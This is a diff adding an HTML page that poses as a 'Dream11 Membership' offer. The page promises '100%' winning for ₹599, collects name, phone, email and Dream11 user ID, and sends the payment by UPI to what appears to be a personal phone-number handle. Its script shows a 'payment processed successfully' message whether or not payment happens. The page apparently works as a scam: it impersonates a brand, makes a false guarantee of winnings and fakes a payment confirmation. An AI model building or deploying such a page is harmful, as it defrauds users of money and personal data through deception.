@@ -1,0 +1,218 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Dream11 Membership</title>
+  <style>
+    :root {
+      --primary-color: #4a00e0;
+      --secondary-color: #8e2de2;
+      --accent-color: #ff6b6b;
+    }
+
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      margin: 0;
+      padding: 0;
+      background: linear-gradient(135deg, var(--primary-color), var(--secondary-color));
+      color: white;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+    }
+
+    .container {
+      max-width: 500px;
+      width: 90%;
+      background-color: rgba(255, 255, 255, 0.1);
+      backdrop-filter: blur(10px);
+      border-radius: 15px;
+      padding: 30px;
+      text-align: center;
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
+    }
+
+    h1 {
+      font-size: 2.5rem;
+      background: linear-gradient(to right, #fff, #ddd);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+    }
+
+    .price {
+      font-size: 4rem;
+      font-weight: bold;
+      color: var(--accent-color);
+      margin: 20px 0;
+    }
+
+    .tagline {
+      font-size: 1.2rem;
+      opacity: 0.9;
+      margin-bottom: 30px;
+    }
+
+    .join-btn {
+      background-color: var(--accent-color);
+      color: white;
+      border: none;
+      padding: 15px 40px;
+      font-size: 1.2rem;
+      border-radius: 50px;
+      cursor: pointer;
+      margin-bottom: 20px;
+      font-weight: bold;
+      box-shadow: 0 5px 15px rgba(255, 107, 107, 0.4);
+      transition: all 0.3s;
+    }
+
+    .join-btn:hover {
+      transform: translateY(-3px);
+    }
+
+    .form-container {
+      display: none;
+      text-align: left;
+      animation: fadeIn 0.5s;
+    }
+
+    .form-group {
+      margin-bottom: 20px;
+    }
+
+    label {
+      display: block;
+      margin-bottom: 8px;
+      font-weight: 500;
+    }
+
+    input {
+      width: 100%;
+      padding: 12px;
+      border-radius: 8px;
+      border: 1px solid rgba(255, 255, 255, 0.3);
+      background-color: rgba(255, 255, 255, 0.1);
+      color: white;
+    }
+
+    .form-actions {
+      display: flex;
+      justify-content: space-between;
+      margin-top: 20px;
+    }
+
+    .btn {
+      padding: 12px 25px;
+      border-radius: 8px;
+      font-weight: bold;
+      cursor: pointer;
+      border: none;
+    }
+
+    .btn-back {
+      background-color: transparent;
+      border: 1px solid white;
+      color: white;
+    }
+
+    .btn-next {
+      background-color: var(--accent-color);
+      color: white;
+    }
+
+    .success-message {
+      display: none;
+      text-align: center;
+    }
+
+    .success-icon {
+      font-size: 5rem;
+      color: #4caf50;
+      margin-bottom: 20px;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(20px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div id="offer-container">
+      <h1>SPECIAL OFFER</h1>
+      <div class="price">₹599</div>
+      <div class="tagline">Join membership winning 100%</div>
+      <button class="join-btn" onclick="showForm()">JOIN NOW</button>
+    </div>
+
+    <div class="form-container" id="form-container">
+      <h2>Membership Details</h2>
+      <form id="membership-form">
+        <div class="form-group">
+          <label for="name">Full Name</label>
+          <input type="text" id="name" placeholder="Enter your full name" required />
+        </div>
+        <div class="form-group">
+          <label for="phone">Phone Number</label>
+          <input type="tel" id="phone" placeholder="Enter your phone number" required />
+        </div>
+        <div class="form-group">
+          <label for="email">Email ID</label>
+          <input type="email" id="email" placeholder="Enter your email address" required />
+        </div>
+        <div class="form-group">
+          <label for="dream11-id">Dream11 User ID</label>
+          <input type="text" id="dream11-id" placeholder="Enter your Dream11 ID" required />
+        </div>
+        <div class="form-actions">
+          <button type="button" class="btn btn-back" onclick="hideForm()">Back</button>
+          <button type="button" class="btn btn-next" onclick="processPayment()">Proceed to Payment</button>
+        </div>
+      </form>
+    </div>
+
+    <div class="success-message" id="success-message">
+      <div class="success-icon">✓</div>
+      <h2>Membership Successful!</h2>
+      <p>Your payment of ₹599 has been processed successfully.</p>
+      <a class="join-btn" href="#">Done</a>
+    </div>
+  </div>
+
+  <script>
+    function showForm() {
+      document.getElementById('offer-container').style.display = 'none';
+      document.getElementById('form-container').style.display = 'block';
+    }
+
+    function hideForm() {
+      document.getElementById('form-container').style.display = 'none';
+      document.getElementById('offer-container').style.display = 'block';
+    }
+
+    function processPayment() {
+      const name = document.getElementById('name').value;
+      const phone = document.getElementById('phone').value;
+      const email = document.getElementById('email').value;
+      const dream11Id = document.getElementById('dream11-id').value;
+
+      if (!name || !phone || !email || !dream11Id) {
+        alert('Please fill all the fields');
+        return;
+      }
+
+      // Redirect to UPI payment
+      const upiUrl = "upi://pay?pa=6005973034@ybl&pn=Dream11%20Membership&am=599&cu=INR";
+      window.location.href = upiUrl;
+
+      // Optional: show success message (could be replaced by UPI callback in real system)
+      document.getElementById('form-container').style.display = 'none';
+      document.getElementById('success-message').style.display = 'block';
+    }
+  </script>
+</body>
+            </html>
+            
